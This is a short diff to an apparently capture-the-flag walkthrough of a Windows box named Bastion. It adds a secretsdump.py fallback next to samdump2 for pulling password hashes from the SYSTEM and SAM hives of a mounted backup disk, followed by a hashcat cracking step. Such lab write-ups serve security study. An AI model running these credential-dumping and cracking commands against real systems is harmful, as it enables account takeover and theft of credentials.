@@ -346,6 +346,8 @@ guestmount --add "/mnt/bastion/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-
 cd /tmp/vhd/Windows/System32/config/
 # using two file SYSTEM and SAM to dump the hashes
 samdump2 SYSTEM SAM > /tmp/hashes.txt
+# If the hashes exported by samdump2 seem unusual
+python3 secretsdump.py -system SYSTEM -sam SAM LOCAL
 # crack user password hash
 hashcat -m 1000 user_hash.txt <password_list.txt>
 ```
